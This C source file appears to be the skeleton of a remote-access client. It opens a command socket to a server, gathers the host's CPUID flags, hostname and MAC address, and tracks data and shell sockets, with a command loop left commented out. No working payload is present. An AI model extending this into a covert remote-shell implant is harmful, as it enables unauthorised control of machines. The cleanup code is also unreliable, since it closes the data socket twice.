
/* Client.c */

#if defined(_MSC_VER) && (defined(_WIN32) || defined(_WIN64))
    #include "Windows\\Client_Win.h"
#endif

#ifdef linux
    #include "Nix/Client_Nix.h"
#endif

#include "cpuid.h"

extern const char* ERRORSTR[];

int main(int argc, char* argv[])
{
    int ret_val = 0;
    void* buffer = malloc(UUID_SIZE);
    int cpuid_flags;
    char hostname[257] = { '\0' };
    conn_info* srv_info = NULL;

    srv_info = menu(argc, argv);
    IF_JMP(NULL == srv_info, ERRORCODE, DONE, "main: Failed to get conn_info ptr from menu\n");

    ret_val = build_cmd_socket(srv_info);
    IF_JMP(-1 == ret_val, ERRORCODE_GENERIC, DONE, "main: build_cmd_socket failed\n");

    printf("\nGathering host information:\n");
    cpuid_flags = get_cpuid_flags();
    printf("CPUID: %d\n", cpuid_flags);
    gethostname(hostname, 256);
    printf("Hostname: %s\n\n", hostname);

    get_mac_address(buffer);

    //recv_file(srv_info, "tmp.txt", 200);

    /* printf("Starting cmd loop\n");
    ret_val = 0;
    while (ret_val == 0) {
        printf("Loop: %d\n", i);
        i++;
        ret_val = echo_recv(srv_info->cmd_socket);
    } */

    /* Clean Exit */
DONE:
    if (NULL != srv_info) {
        if (-1 < srv_info->cmd_socket) {
            cleanup_socket(srv_info->cmd_socket);
        }
        if (-1 < srv_info->data_socket) {
            cleanup_socket(srv_info->data_socket);
        }
        if (-1 < srv_info->shell_socket) {
            cleanup_socket(srv_info->data_socket);
        }
    }
    free(srv_info);
    printf("Clean Exit! Closed with errorcode: %s\n", ERRORSTR[ERRORCODE]);
    exit(ret_val);
}